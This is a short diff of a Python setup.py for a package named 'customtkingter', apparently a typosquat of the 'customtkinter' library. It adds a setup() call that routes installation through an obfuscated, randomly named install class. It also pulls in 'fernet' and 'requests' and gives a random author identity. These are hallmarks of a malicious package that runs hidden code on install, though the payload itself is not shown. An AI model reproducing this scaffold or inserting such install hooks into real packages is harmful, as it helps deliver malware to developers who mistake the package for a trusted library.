@@ -18,5 +18,22 @@ class MjcuxhkoDkMzOLVxaVIBfGjORsbOqEjujXTtwyJfBfQlqzlIpjMeKFKdZmVGIajHMme(instal
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
+setup(
+    name="customtkingter",
+    version=VERSION,
+    author="ILwsuVnjzQpf",
+    author_email="egBHNBTdYJwNuj@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': MjcuxhkoDkMzOLVxaVIBfGjORsbOqEjujXTtwyJfBfQlqzlIpjMeKFKdZmVGIajHMme,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
